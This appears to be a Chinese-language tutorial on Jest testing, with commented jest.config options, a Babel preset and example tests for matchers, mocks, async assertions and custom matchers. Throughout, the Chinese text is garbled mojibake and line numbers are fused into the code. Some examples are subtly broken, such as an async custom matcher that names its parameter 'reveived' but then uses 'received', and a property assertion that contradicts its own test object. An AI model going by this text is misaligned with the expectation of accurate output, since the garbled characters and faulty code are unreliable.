ä¸ºè¦å¸¦ä¸Šè¦†ç›–çŽ‡æœé›†è¯­å¥è®¿é—®æ‰€æœ‰æ‰§è¡Œè¿‡çš„æ–‡ä»¶ï¼Œè¿™å¯èƒ½ä¼šè®©æµ‹è¯•æ‰§è¡Œé€Ÿåº¦æ˜Žæ˜¾å‡æ…¢ // collectCoverage: false, // An array of glob patterns indicating a set of files for which coverage information should be collected // æŒ‡ç¤ºåº”æ”¶é›†è¦†ç›–çŽ‡ä¿¡æ¯çš„å…¨å±€æ¨¡å¼ä¸€ç»„æ–‡ä»¶ï¼Œå³ä½¿æ–‡ä»¶ä¸å­˜åœ¨æµ‹è¯•ï¼Œä¹Ÿå°†ä¸ºå…¶æ”¶é›†è¦†ç›–çŽ‡ä¿¡æ¯ï¼Œå¹¶ä¸”æµ‹è¯•å¥—ä»¶ä¸­ä¸éœ€è¦å®ƒ // collectCoverageFrom: null, // The directory where Jest should output its coverage files // jest è¾“å‡ºæµ‹é€Ÿè¦†ç›–çŽ‡æ–‡ä»¶çš„ç›®å½• // è¿è¡Œ npx jest --coverage coverageDirectory: "coverage", // An array of regexp pattern strings used to skip coverage collection // å¿½ç•¥æµ‹è¯•çš„æ–‡ä»¶è·¯å¾„çš„æ­£åˆ™åŒ¹é… // coveragePathIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // A list of reporter names that Jest uses when writing coverage reports // coverageReporters: [ // "json", // "text", // "lcov", // "clover" // ], // An object that configures minimum threshold enforcement for coverage results // coverageThreshold: null, // A path to a custom dependency extractor // dependencyExtractor: null, // Make calling deprecated APIs throw helpful error messages // errorOnDeprecated: false, // Force coverage collection from ignored files using an array of glob patterns // forceCoverageMatch: [], // A path to a module which exports an async function that is triggered once before all test suites // globalSetup: null, // A path to a module which exports an async function that is triggered once after all test suites // globalTeardown: null, // A set of global variables that need to be available in all test environments // globals: &#123;&#125;, // The maximum amount of workers used to run your tests. Can be specified as % or a number. E.g. maxWorkers: 10% will use 10% of your CPU amount + 1 as the maximum worker number. maxWorkers: 2 will use a maximum of 2 workers. // maxWorkers: "50%", // An array of directory names to be searched recursively up from the requiring module's location // moduleDirectories: [ // "node_modules" // ], // An array of file extensions your modules use // æ¨¡å—ä½¿ç”¨æ–‡ä»¶æ‰©å±•åæ•°ç»„ï¼Œå½“ä½ å¯¼å…¥çš„æ–‡ä»¶æ²¡æœ‰æ‰©å±•åçš„æ—¶å€™ï¼Œå®ƒä¼šåœ¨è¿™ä¸ªæ•°ç»„é‡Œé¢åŽ»è‡ªåŠ¨åŒ¹é… // moduleFileExtensions: [ // "js", // "json", // "jsx", // "ts", // "tsx", // "node" // ], // A map from regular expressions to module names that allow to stub out resources with a single module // æ¨¡å—åæ˜ å°„ï¼Œç±» webpack alias ä»¥åŠ jsconfig.js çš„ compilerOptions.paths // moduleNameMapper: &#123;&#125;, // An array of regexp pattern strings, matched against all module paths before considered 'visible' to the module loader // modulePathIgnorePatterns: [], // Activates notifications for test results // notify: false, // An enum that specifies notification mode. Requires &#123; notify: true &#125; // notifyMode: "failure-change", // A preset that is used as a base for Jest's configuration // preset: null, // Run tests from one or more projects // projects: null, // Use this configuration option to add custom reporters to Jest // reporters: undefined, // Automatically reset mock state between every test // resetMocks: false, // Reset the module registry before running each individual test // resetModules: false, // A path to a custom resolver // resolver: null, // Automatically restore mock state between every test // restoreMocks: false, // The root directory that Jest should scan for tests and modules within // rootDir: null, // A list of paths to directories that Jest should use to search for files in // roots: [ // "&lt;rootDir&gt;" // ], // Allows you to use a custom runner instead of Jest's default test runner // runner: "jest-runner", // The paths to modules that run some code to configure or set up the testing environment before each test // setupFiles: [], // A list of paths to modules that run some code to configure or set up the testing framework before each test // è¿è¡Œåšæµ‹è¯•çš„æ—¶å€™ä½¿ç”¨æŸäº›åž«ç‰‡ä¸ºè¿è¡ŒçŽ¯å¢ƒåšå…¼å®¹ // setupFilesAfterEnv: [], // A list of paths to snapshot serializer modules Jest should use for snapshot testing // å¿«ç…§æ ¼å¼åŒ– // snapshotSerializers: [], // The test environment that will be used for testing // testEnvironment: "jest-environment-jsdom", // Options that will be passed to the testEnvironment // testEnvironmentOptions: &#123;&#125;, // Adds a location field to test results // testLocationInResults: false, // The glob patterns Jest uses to detect test files // åŒ¹é…æµ‹è¯•æ–‡ä»¶ // testMatch: [ // "**/__tests__/**/*.[jt]s?(x)", // "**/?(*.)+(spec|test).[tj]s?(x)" // ], // An array of regexp pattern strings that are matched against all test paths, matched tests are skipped // testPathIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // The regexp pattern or array of patterns that Jest uses to detect test files // testRegex: [], // This option allows the use of a custom results processor // testResultsProcessor: null, // This option allows use of a custom test runner // testRunner: "jasmine2", // This option sets the URL for the jsdom environment. It is reflected in properties such as location.href // æ¨¡æ‹Ÿæµè§ˆå™¨çš„åœ°å€ // testURL: "http://localhost", // Setting this value to "fake" allows the use of fake timers for functions such as "setTimeout" // timers: "real", // A map from regular expressions to paths to transformers // ä¸åŒæ–‡ä»¶ç±»åž‹å¯¹åº”ä¸åŒçš„è½¬æ¢å™¨ // transform: null, // An array of regexp pattern strings that are matched against all source file paths, matched files will skip transformation // transformIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // An array of regexp pattern strings that are matched against all modules before the module loader will automatically return a mock for them // unmockedModulePathPatterns: undefined, // Indicates whether each individual test should be reported during the run // verbose: null, // An array of regexp patterns that are matched against all source file paths before re-running tests in watch mode // watchPathIgnorePatterns: [], // Whether to use watchman for file crawling // watchman: true,&#125;; babelrcjest æœªé…ç½®è½¬æ¢æ—¶ï¼Œé»˜è®¤åªæ”¯æŒ commonjs è¯­æ³•ã€‚ 123456789101112&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "node": "current" &#125; &#125; ] ]&#125; jestè½¬æ¢ï¼ˆcommonjs -&gt; es moduleï¼‰å¤§æ¦‚å·¥ä½œåŽŸç†ï¼š npm run jest jestï¼ˆbabel-jestï¼‰jest å†…éƒ¨çš„ æ£€æµ‹æ˜¯æœ‰ babel-core æ‹¿åˆ° .babelrc é…ç½® å†è¿è¡Œæµ‹è¯•ä¹‹å‰ï¼Œç»“åˆ babel æŠŠä»£ç åšä¸€æ¬¡è½¬åŒ– è¿è¡Œè½¬åŒ–è¿‡çš„æµ‹è¯•ç”¨ä¾‹ å¸¸ç”¨åŒ¹é…å™¨ï¼ˆMatchersï¼‰æ•°å­—.toBe().toEqual(value).toBeGreaterThan(number).toBeGreaterThanOrEqual(number).toBeLessThan(number).toBeLessThanOrEqual(number).toBeCloseTo(number,numDigits?)ç¬¬äºŒä¸ªå‚æ•°ä¸ºç²¾åº¦ï¼Œä»£è¡¨å‡ ä½å°æ•°ç‚¹ï¼Œé»˜è®¤ä¸º2ä½ .toBeNaN()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// æ•°å­—ç›¸å…³test('åŒ¹é…å™¨ï¼štoBe-æ•°å­—ç›¸ç­‰', () =&gt; &#123; // toBe åŒ¹é…å™¨ matchers Object.is() === const a = 10 expect(a).toBe(10)&#125;)test('åŒ¹é…å™¨ï¼štoEqual-å†…å®¹ç›¸ç­‰', () =&gt; &#123; // toEqual åŒ¹é…å™¨ matchers const a = &#123; one: 1 &#125; expect(a).toEqual(&#123; one: 1 &#125;)&#125;)test('åŒ¹é…å™¨ï¼štoBeGreaterThan-å¤§äºŽæ¯”è¾ƒæ•°', () =&gt; &#123; // toBeGreaterThan åŒ¹é…å™¨ matchers const a = 4 expect(a).toBeGreaterThan(3)&#125;)test('åŒ¹é…å™¨ï¼štoBeGreaterThanOrEqual-å¤§äºŽç­‰äºŽæ¯”è¾ƒæ•°', () =&gt; &#123; // toBeGreaterThanOrEqual åŒ¹é…å™¨ matchers const a = 4 expect(a).toBeGreaterThanOrEqual(4)&#125;)test('åŒ¹é…å™¨ï¼štoBeLessThan-å°äºŽæ¯”è¾ƒæ•°', () =&gt; &#123; // toBeLessThan åŒ¹é…å™¨ matchers const a = 4 expect(a).toBeLessThan(5)&#125;)test('åŒ¹é…å™¨ï¼štoBeLessThanOrEqual-å°äºŽç­‰äºŽæ¯”è¾ƒæ•°', () =&gt; &#123; // toBeLessThanOrEqual åŒ¹é…å™¨ matchers const a = 4 expect(a).toBeLessThanOrEqual(4)&#125;)// æµ®ç‚¹æ•°test('åŒ¹é…å™¨ï¼štoBeCloseTo-ä¸¤ä¸ªæµ®ç‚¹æ•°å­—ç›¸åŠ ', () =&gt; &#123; // toBeCloseTo åŒ¹é…å™¨ matchers const value = 0.1 + 0.2; // expect(value).toBe(0.3); è¿™å¥ä¼šæŠ¥é”™ï¼Œå› ä¸ºæµ®ç‚¹æ•°æœ‰èˆå…¥è¯¯å·® expect(value).toBeCloseTo(0.3); // è¿™å¥å¯ä»¥è¿è¡Œ&#125;);// NaNtest('åŒ¹é…å™¨ï¼štoBeNaN-ç­‰äºŽNaN', () =&gt; &#123; expect(NaN).toBeNaN(); expect(1).not.toBeNaN();&#125;); çœŸå‡ toBeNullåªåŒ¹é… null toBeUndefinedåªåŒ¹é… undefined toBeDefined ä¸Ž toBeUndefinedç›¸å toBeTruthy åŒ¹é…ä»»ä½• if è¯­å¥ä¸ºçœŸ toBeFalsyåŒ¹é…ä»»ä½• if è¯­å¥ä¸ºå‡ .toBeNull().toBeUndefined().toBeDefined().toBeTruthy().toBeFalsy()åœ¨JavaScriptä¸­ï¼Œæœ‰å…­ä¸ªfalsyå€¼ï¼šfalseï¼Œ0ï¼Œ&#39;&#39;ï¼Œnullï¼Œundefinedï¼Œå’ŒNaNã€‚å…¶ä»–ä¸€åˆ‡éƒ½æ˜¯çœŸå®žçš„ã€‚ 123456789101112131415161718192021222324252627282930// çœŸå‡ç›¸å…³test('åŒ¹é…å™¨ï¼štoBeNull-ä¸Žnullç›¸ç­‰', () =&gt; &#123; // toBeNull åŒ¹é…å™¨ matchers const a = null expect(a).toBeNull()&#125;)test('åŒ¹é…å™¨ï¼štoBeUndefined-ä¸Žundefinedç›¸ç­‰', () =&gt; &#123; // toBeUndefined åŒ¹é…å™¨ matchers const a = undefined expect(a).toBeUndefined()&#125;)test('åŒ¹é…å™¨ï¼štoBeDefined-è¢«å®šä¹‰è¿‡çš„,éž undefined çš„ï¼Œå¯ä¸º null', () =&gt; &#123; // toBeDefined åŒ¹é…å™¨ matchers const a = null expect(a).toBeDefined()&#125;)test('åŒ¹é…å™¨ï¼štoBeTruthy-çœŸå€¼æˆ–è€…éšè—ä¸ºtrueçš„', () =&gt; &#123; // toBeTruthy åŒ¹é…å™¨ matchers const a = 1 expect(a).toBeTruthy()&#125;)test('åŒ¹é…å™¨ï¼štoBeFalsy-çœŸå€¼æˆ–è€…éšè—ä¸ºfalseçš„', () =&gt; &#123; // toBeFalsy åŒ¹é…å™¨ matchers const a = null expect(a).toBeFalsy()&#125;) å¦å®š.not12345test('åŒ¹é…å™¨ï¼šnot-ä¸æ˜¯xx', () =&gt; &#123; // not åŒ¹é…å™¨ matchers const a = 1 expect(a).not.toBeFalsy()&#125;) expect.not.arrayContaining(array)åŒ¹é…ä¸æ˜¯æŽ¥æ”¶å€¼çš„å­é›† 12345678describe('not.arrayContaining', () =&gt; &#123; const expected = [1]; it('å¦‚æžœæŽ¥æ”¶çš„æ•°ç»„ä¸åŒ…å«1å°±é€šè¿‡æµ‹è¯•', () =&gt; &#123; expect([2, 3, 4]).toEqual( expect.not.arrayContaining(expected) ) &#125;)&#125;) expect.not.objectContaining(object)åŒ¹é…ä¸åŒ…å«æŸä¸ªå¯¹è±¡ 12345678describe('not.objectContaining', () =&gt; &#123; const expected = &#123; haha: 'laibh.top' &#125;; it('å¦‚æžœæŽ¥æ”¶çš„å¯¹è±¡ä¸åŒ…å«&#123; haha: laibh.top &#125;å°±é€šè¿‡æµ‹è¯•', () =&gt; &#123; expect(&#123; haha: 'laibh.top1' &#125;).toEqual( expect.not.objectContaining(expected) ) &#125;)&#125;) expect.not.stringContaining(string)åŒ¹é…ä¸åŒ…å«æŸä¸ªå­—ç¬¦ä¸² 1234567describe('not.stringContaining', () =&gt; &#123; const expected = 'èµ–åŒå­¦'; it('å¦‚æžœæŽ¥æ”¶çš„å­—ç¬¦ä¸²ä¸å®Œå…¨ç­‰äºŽèµ–åŒå­¦å°±é€šè¿‡æµ‹è¯•', () =&gt; &#123; expect('èµ–').toEqual(expect.not.stringContaining(expected)); &#125;);&#125;); expect.not.stringMatching(string|regexp)åŒä¸Šï¼Œä¸è¿‡å‚æ•°å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼ 1234567describe('not.stringMatching', () =&gt; &#123; const expected = /èµ–åŒå­¦/; it('å¦‚æžœæŽ¥æ”¶çš„å­—ç¬¦ä¸²èµ–åŒå­¦å°±é€šè¿‡æµ‹è¯•', () =&gt; &#123; expect('èµ–').toEqual(expect.not.stringMatching(expected)); &#125;);&#125;); å­—ç¬¦ä¸².toMatch(regexpOrString)12345678// å­—ç¬¦ä¸²test('åŒ¹é…å™¨ï¼štoMatch-æ­£åˆ™å­—ç¬¦ä¸²åŒ¹é…', () =&gt; &#123; // toMatch åŒ¹é…å™¨ matchers const str = 'http://laibh.top' expect(str).toMatch('laibh') // ä½¿ç”¨æ­£åˆ™ expect(str).toMatch(/laibh/)&#125;) expect.stringContaining(string)åŒ¹é…åŒ…å«æŸä¸ªå­—ç¬¦ä¸² expect.stringMatching(string|regexp)åŒ¹é…å­—ç¬¦ä¸²ï¼Œå¯ç”¨æ­£åˆ™ 12345678910111213141516describe('stringMatching in arrayContaining', () =&gt; &#123; const expected = [ expect.stringMatching(/^Alic/), expect.stringMatching(/^[BR]ob/), ]; it('matches even if received contains additional elements', () =&gt; &#123; expect(['Alicia', 'Roberto', 'Evelina']).toEqual( expect.arrayContaining(expected), ); &#125;); it('does not match if received does not contain expected elements', () =&gt; &#123; expect(['Roberto', 'Evelina']).not.toEqual( expect.arrayContaining(expected), ); &#125;);&#125;) æ•°ç»„expect.toContain()123456789// æ•°ç»„test('åŒ¹é…å™¨ï¼štoContain-æ•°ç»„åŒ…å«æŸé¡¹', () =&gt; &#123; // toContain åŒ¹é…å™¨ matchers const arr = ['lai', 'bin', 'hong'] const set = new Set(arr) expect(set).toContain('lai') expect(arr).toContain('lai')&#125;) expect.arrayContaining(array)åŒ¹é…å­é›† 123456789describe('arrayContaining', () =&gt; &#123; const expected = ['1', '2']; it('å³ä½¿æŽ¥æ”¶å€¼åŒ…å«å…¶ä»–å‚æ•°ä¹ŸåŒ¹é…', () =&gt; &#123; expect(['1', '2', '3']).toEqual(expect.arrayContaining(expected)); &#125;); it('åªè¦æŽ¥æ”¶å€¼ä¸åŒ…å«æœŸæœ›çš„å€¼å°±ä¸åŒ¹é…', () =&gt; &#123; expect(['2', '4']).not.toEqual(expect.arrayContaining(expected)); &#125;);&#125;); å¯¹è±¡objectContaining(object)åŒ¹é…ä»»ä½•é€’å½’é¢„æœŸå±žæ€§çš„æŽ¥æ”¶å¯¹è±¡ 12345678910test('æµ‹è¯•onPresså‡½æ•°å›žè°ƒå‚æ•°åŒ¹é…å¯¹è±¡', () =&gt; &#123; const onPress = jest.fn(); simulatePresses(onPress) expect(onPress).toBeCalledWith( expect.objectContaining(&#123; x: expect.any(Number), y: expect.any(Number) &#125;) )&#125;) .toHaveProperty(keyPath,value?)æ£€æŸ¥å¯¹è±¡ä¸­å„ç§å±žæ€§å­˜åœ¨å’Œå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ 12345678910111213141516171819202122232425262728293031323334353637383940414243// Object containing house features to be testedconst houseForSale = &#123; bath: true, bedrooms: 4, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], area: 20, wallColor: 'white', 'nice.oven': true, &#125;, 'ceiling.height': 2,&#125;;test('this house has my desired features', () =&gt; &#123; // Simple Referencing expect(houseForSale).toHaveProperty('bath'); expect(houseForSale).toHaveProperty('bedrooms', 4); expect(houseForSale).not.toHaveProperty('pool'); // åµŒå¥—æ·±å±‚ç”¨ . expect(houseForSale).toHaveProperty('kitchen.area', 20); expect(houseForSale).toHaveProperty('kitchen.amenities', [ 'oven', 'stove', 'washer', ]); expect(houseForSale).not.toHaveProperty('kitchen.open'); // åµŒå¥—æ·±å±‚ç”¨ [] expect(houseForSale).toHaveProperty(['kitchen', 'area'], 20); expect(houseForSale).toHaveProperty( ['kitchen', 'amenities'], ['oven', 'stove', 'washer'], ); expect(houseForSale).toHaveProperty(['kitchen', 'amenities', 0], 'oven'); expect(houseForSale).toHaveProperty(['kitchen', 'nice.oven']); expect(houseForSale).not.toHaveProperty(['kitchen', 'open']); // Referencing keys with dot in the key itself expect(houseForSale).toHaveProperty(['ceiling.height'], 'tall');&#125;); .toMatchObject(object)æ£€æŸ¥å¯¹è±¡çš„å±žæ€§çš„å­é›†ç›¸åŒ¹é… 1234567891011121314151617181920const houseForSale = &#123; bath: true, bedrooms: 4, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], area: 20, wallColor: 'white', &#125;,&#125;;const desiredHouse = &#123; bath: true, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], wallColor: expect.stringMatching(/white|yellow/), &#125;,&#125;;test('the house has my desired features', () =&gt; &#123; expect(houseForSale).toMatchObject(desiredHouse);&#125;); ç±».toBeInstanceOf(Class)æ£€æŸ¥å¯¹è±¡æ˜¯ä¸€ä¸ªç±»çš„å®žä¾‹ 12345class A &#123;&#125;expect(new A()).toBeInstanceOf(A);expect(() =&gt; &#123;&#125;).toBeInstanceOf(Function);expect(new A()).toBeInstanceOf(Function); // throws å¼‚å¸¸.toThrow(error?)1234567891011const throwNewErrorFunc = () =&gt; &#123; throw new Error('this is a new error') &#125;// å¼‚å¸¸test('åŒ¹é…å™¨ï¼štoThrow-æµ‹è¯•æŠ›å‡ºå¼‚å¸¸', () =&gt; &#123; // toThrow åŒ¹é…å™¨ matchers expect(throwNewErrorFunc).toThrow() // æµ‹è¯•æŠ›å‡ºçš„å†…å®¹ expect(throwNewErrorFunc).toThrow('this is a new error') // è¡¨è¾¾å¼ä¹Ÿè¡Œ expect(throwNewErrorFunc).toThrow(/this is a new error/)&#125;) ä»»æ„expect.anything()åŒ¹é…é™¤äº† nullã€undefinedçš„ä»»æ„å€¼ï¼Œå¯ä»¥å®ƒä½¿ç”¨åœ¨ toEqualæˆ–è€… toBeCalledWithé‡Œé¢æ›¿ä»£æ–‡å­—å€¼ 12345test('map éåŽ†ä¸€ä¸ªéžç©ºçš„å‚æ•°',()=&gt;&#123; const mock = jest.fn(); [1].map(x =&gt; mock(x)) expect(mock).toBeCalledWith(expect.anything())&#125;) expect.any(constructor)åŒ¹é…ä»»æ„æž„é€ å™¨ç”Ÿæˆçš„å®žä¾‹ 12345678function randocall(fn)&#123; return fn(Math.floor(Math.random()*6 + 1))&#125;test('æµ‹è¯• randocallçš„å›žè°ƒå‡½æ•°è°ƒç”¨äº†ä¸€ä¸ªæ•°å­—',()=&gt;&#123; const mock = jest.fn(); randocall(mock) expect(mock).toBeCalledWith(expect.any(Number))&#125;) .toHaveLength(number)æ£€æŸ¥å¯¹è±¡æœ‰ä¸ª length å±žæ€§å¹¶å°†è®¾ä¸ºæŸä¸€æ•°å€¼ã€‚è¿™å¯¹äºŽæ£€æŸ¥æ•°ç»„æˆ–å­—ç¬¦ä¸²å¤§å°ç‰¹åˆ«æœ‰ç”¨ã€‚ 123expect([1, 2, 3]).toHaveLength(3);expect('abc').toHaveLength(3);expect('').not.toHaveLength(5); .toContain(item)æ£€æŸ¥é¡¹ç›®åœ¨æ•°ç»„æˆ–è€…å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¦ä¸€ä¸ªå­—ç¬¦ä¸²çš„å­ä¸² 123test('the flavor list contains lime', () =&gt; &#123; expect(getAllFlavors()).toContain('lime');&#125;); .toContainEqual(item)æ£€æŸ¥å…·æœ‰ç‰¹å®šç»“æž„å’Œå€¼çš„å…ƒç´ æ˜¯å¦åŒ…å«åœ¨æ•°æ®ä¸­ 1234it('test contain', () =&gt; &#123; const testValue = &#123; bol: true &#125; expect([&#123; bol: true &#125;, &#123; sour: false &#125;]).toContainEqual(testValue)&#125;) å¼‚æ­¥ç›¸å…³expect.assertions()åŒ¹é…åœ¨æµ‹è¯•ç”¨ä¾‹é‡Œé¢ä½¿ç”¨æ–­è¨€çš„æ¬¡æ•°ã€‚ç¡®ä¿åœ¨å¼‚æ­¥å‡½æ•°ä¸ºäº†ç¡®ä¿åœ¨å›žè°ƒå‡½æ•°é‡Œé¢æ–­è¨€è¢«è°ƒç”¨ç‰¹åˆ«æœ‰ç”¨ã€‚ 1234567891011test('å¼‚æ­¥è°ƒç”¨æ‰€æœ‰å›žè°ƒ',()=&gt;&#123; // ç¡®ä¿æœ‰ä¸¤ä¸ªæ–­è¨€è¢«è°ƒç”¨ expect.assertions(2) function callback1(data)&#123; expect(data).toBeTruthy() &#125; function callback2(data)&#123; expect(data).toBeTruthy(); &#125; doAsync(callback1,callback2)&#125;) expect.hasAssertions()åŒ¹é…åœ¨æµ‹è¯•ç”¨ä¾‹é‡Œé¢è‡³å°‘ä½¿ç”¨ä¸€æ¬¡æ–­è¨€ .resolvesä½¿ç”¨ resolvesè§£å¼€ fulfilled promiseï¼Œå¦‚æžœ reject promiseï¼Œåˆ™æ–­è¨€å¤±è´¥ 1234test('resolves to lemon', () =&gt; &#123; // make sure to add a return statement return expect(Promise.resolve('lemon')).resolves.toBe('lemon');&#125;); æµ‹è¯•æ˜¯å¼‚æ­¥çš„ï¼Œéœ€è¦å‘Šè¯‰ jest ç­‰å¾…è¿”å›žè§£å¼€çš„æ–­è¨€ ä¹Ÿå¯ä»¥ç”¨ async/awaitç»“åˆ .resolves 1234test('resolves to lemon', async () =&gt; &#123; await expect(Promise.resolve('lemon')).resolves.toBe('lemon'); await expect(Promise.resolve('lemon')).resolves.not.toBe('octopus');&#125;); .rejectsä½¿ç”¨ rejectsè§£å¼€ rejected promise,å¦‚æžœ fulfilled promise,åˆ™æ–­è¨€å¤±è´¥ 1234test('rejects to octopus', async () =&gt; &#123; // make sure to add a return statement return expect(Promise.reject(new Error('octopus'))).rejects.toThrow('octopus');&#125;); æµ‹è¯•æ˜¯å¼‚æ­¥çš„ï¼Œéœ€è¦å‘Šè¯‰ jest ç­‰å¾…è¿”å›žè§£å¼€çš„æ–­è¨€ åŒæ ·ä½¿ç”¨ async/awaitç»“åˆ .rejects 1234test('rejects to octopus', async () =&gt; &#123; await expect(Promise.reject(new Error('octopus'))).rejects.toThrow('octopus'); await expect(Promise.reject(new Error('octopus'))).rejects.not.toThrow('lemon');&#125;); å‡½æ•°è°ƒç”¨.toHaveBeenCalled()|.toBeCalled()ç¡®ä¿æ¨¡æ‹ŸåŠŸèƒ½å¾—åˆ°è°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334353637function drinkAll(cb, flavour) &#123; if (flavour !== 'octopus') &#123; cb(flavour) &#125;&#125;describe('test drinkAll function', () =&gt; &#123; test('drink somthing lemon-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'lemon') expect(drink).toBeCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('does not drink somthing octopus-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'octopus') expect(drink).not.toBeCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('drink somthing lemon-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'lemon') expect(drink).toHaveBeenCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('does not drink somthing octopus-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'octopus') expect(drink).not.toHaveBeenCalled(); &#125;)&#125;) .toHaveBeenCallTimes(number)|.toBeCalledTimes(number)ç¡®ä¿æ¨¡æ‹ŸåŠŸèƒ½å¾—åˆ°è°ƒç”¨æ¬¡æ•°ä¸ŽæŒ‡å®šæ•°å­—ä¸€è‡´ 123456test('drinkEach drinks each drink', () =&gt; &#123; const drink = jest.fn(); drinkEach(drink, ['lemon', 'octopus']); expect(drink).toHaveBeenCalledTimes(2); expect(drink).toBeCalledTimes(2);&#125;); .toHaveBeenCalledWith(arg1,arg2,â€¦)|.toBeCalledWith(arg1,arg2,â€¦)ç¡®ä¿æ¨¡æ‹ŸåŠŸèƒ½è¢«è°ƒç”¨çš„å…·ä½“å‚æ•° 12345678910function calledWithArg(cb) &#123; cb('Arg')&#125;test('test calledWithArg', () =&gt; &#123; const fn = jest.fn(); calledWithArg(fn); expect(fn).toBeCalledWith('Arg'); expect(fn).toHaveBeenCalledWith('Arg');&#125;); .toHaveBeenLastCalledWith(arg1,arg2,â€¦)|.lastCalledWith(arg1, arg2, â€¦)ç¡®ä¿æ¨¡æ‹ŸåŠŸèƒ½è¢«æœ€åŽä¸€æ¬¡è°ƒç”¨çš„å…·ä½“å‚æ•° .toHaveBeenNthCalledWith(nthCall, arg1, arg2, â€¦.)|.nthCalledWith(nthCall, arg1, arg2, â€¦.)ç¡®ä¿æ¨¡æ‹ŸåŠŸèƒ½å¤šæ¬¡è°ƒç”¨çš„é¡ºåº 12345678test('drinkEach drinks each drink', () =&gt; &#123; const drink = jest.fn(); drinkEach(drink, ['lemon', 'octopus']); expect(drink).toHaveBeenNthCalledWith(1, 'lemon'); expect(drink).toHaveBeenNthCalledWith(2, 'octopus'); expect(drink).nthCalledWith(1, 'lemon'); expect(drink).nthCalledWith(2, 'octopus'); &#125;); n å¿…é¡»æ˜¯ä»Ž 1å¼€å§‹çš„æ­£æ•´æ•° .toHaveReturned()|.toReturn()æµ‹è¯•æ¨¡æ‹Ÿå‡½æ•°æˆåŠŸè¿”å›ž(å³æ²¡æœ‰æŠ›å‡ºé”™è¯¯)è‡³å°‘ä¸€æ¬¡ 123456test('test calledWithArg', () =&gt; &#123; const fn = jest.fn(); calledWithArg(fn); expect(fn).toHaveReturned(); expect(fn).toReturn();&#125;); .toHaveReturnedTimes(number)|.toReturnTimes(number)ç¡®ä¿æ¨¡æ‹Ÿå‡½æ•°è¿”å›žæˆåŠŸçš„æ¬¡æ•°,æŠ›å‡ºé”™è¯¯çš„æ¨¡æ‹Ÿå‡½æ•°çš„ä»»ä½•è°ƒç”¨éƒ½ä¸è®¡å…¥å‡½æ•°è¿”å›žçš„æ¬¡æ•° 12345678test('drink returns twice', () =&gt; &#123; const drink = jest.fn(() =&gt; true); drink(); drink(); expect(drink).toHaveReturnedTimes(2);&#125;); .toHaveReturnedWith(value)|.toReturnWith(value)ç¡®ä¿æ¨¡æ‹Ÿå‡½æ•°è¿”å›žç‰¹å®šçš„å€¼ 123456test('test Return 123', () =&gt; &#123; const fn = jest.fn(() =&gt; 123); calledWithArg(fn); expect(fn).toHaveReturnedWith(123) expect(fn).toReturnWith(123)&#125;); .toHaveLastReturnedWith(value)|.lastReturnedWith(value)ç¡®ä¿æ¨¡æ‹Ÿå‡½æ•°æœ€åŽä¸€æ¬¡è¿”å›žç‰¹å®šçš„å€¼ .toHaveNthReturnedWith(nthCall, value)|.nthReturnedWith(nthCall, value)ç¡®ä¿æ¨¡æ‹Ÿå‡½æ•°ç¬¬næ¬¡è°ƒç”¨è¿”å›žç‰¹å®šçš„å€¼ ç¬¬nä¸ªå‚æ•°å¿…é¡»æ˜¯ä»Ž1å¼€å§‹çš„æ­£æ•´æ•°ã€‚ è‡ªå®šä¹‰æ‰©å±•expect.extend()passè¡¨ç¤ºæ˜¯å¦æœ‰åŒ¹é…ï¼Œmessageæä¾›ä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„å‡½æ•°ï¼Œåœ¨å‡ºçŽ°é”™è¯¯çš„æƒ…å†µä¸‹è¿”å›žæ¶ˆæ¯ã€‚å½“pass:falseï¼Œmessageè¿”å›ž expect(x).matcher()å¤±è´¥çš„é”™è¯¯ä¿¡æ¯ï¼Œpass:trueï¼Œmessageè¿”å›žå½“expect(x).not.matcher()å¤±è´¥æ—¶çš„é”™è¯¯æ¶ˆæ¯ 1234567891011121314151617181920212223242526// expect.extend(matchers)expect.extend(&#123; toBeWithinRange(reveived, floor, ceiling) &#123; const pass = reveived &gt;= floor &amp;&amp; reveived &lt;= ceiling; if (pass) &#123; return &#123; message: () =&gt; `æœŸå¾… $&#123;reveived&#125; ä¸åœ¨èŒƒå›´$&#123;floor&#125;-$&#123;ceiling&#125;å†…`, pass, &#125; &#125; else &#123; return &#123; message: () =&gt; `æœŸå¾… $&#123;reveived&#125; åœ¨èŒƒå›´$&#123;floor&#125;-$&#123;ceiling&#125;å†…`, pass, &#125; &#125; &#125;&#125;)test('æµ‹è¯•èŒƒå›´', () =&gt; &#123; expect(100).toBeWithinRange(90, 100) expect(101).not.toBeWithinRange(0, 100) expect(&#123; apples: 6, bananas: 3 &#125;).toEqual(&#123; apples: expect.toBeWithinRange(1, 10), bananas: expect.not.toBeWithinRange(11, 20), &#125;)&#125;) å¼‚æ­¥æ‰©å±•,éœ€è¦ç»“åˆ asyncå’Œ awaitå‡½æ•°æ¥ä½¿ç”¨ 123456789101112131415161718expect.extend(&#123; async toBeDivisibleByExternalValue(reveived)&#123; // å¼‚æ­¥èŽ·å–çš„é™¤æ•° const externalValue = await getExternalValueFromRemoteSource(); const pass = received % externalValue == 0; if(pass)&#123; return&#123; message:()=&gt;`æœŸå¾…$&#123;received&#125;ä¸è¢«$&#123;externalValue&#125;æ•´é™¤`, pass &#125; &#125;else&#123; return&#123; message:()=&gt;`æœŸå¾…$&#123;received&#125;è¢«$&#123;externalValue&#125;æ•´é™¤`, pass &#125; &#125; &#125;&#125;) æ›´å¤š 